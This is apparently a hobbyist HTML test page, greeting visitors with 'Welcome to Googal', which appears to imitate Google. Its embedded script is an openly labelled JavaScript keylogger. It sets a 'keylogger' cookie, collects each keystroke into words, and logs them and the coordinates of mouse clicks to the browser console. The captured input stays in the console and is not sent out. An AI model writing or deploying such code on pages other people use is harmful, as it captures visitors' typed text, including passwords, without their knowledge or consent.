<!doctype html>
<html class="no-js" lang="">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <title>Testing</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
    </head>
    <body>
        
        <div style="margin:200px; border:5">
            Welcome to Googal.
        </div>

        <script>

            document.cookie = "keylogger=";
            var limiter = [190, 13, 9];
            var words = [];
            var word = "";

            document.addEventListener("keydown", function(e){            
                if (limiter.includes(e.keyCode)){
                    words.push(word);
                    console.log(words + e.key);
                    words = [];
                    word = "";
                }
                else if (e.keyCode == 32){
                    words.push(word);                    
                    word = "";
                }
                else {
                    word += e.key;                                        
                }            
            })    

            document.addEventListener("mousedown", function(f){

                console.log("X-Pos: " + f.screenX + "\nY-Pos: " + f.screenY);

            })

        </script>
    </body>
</html>
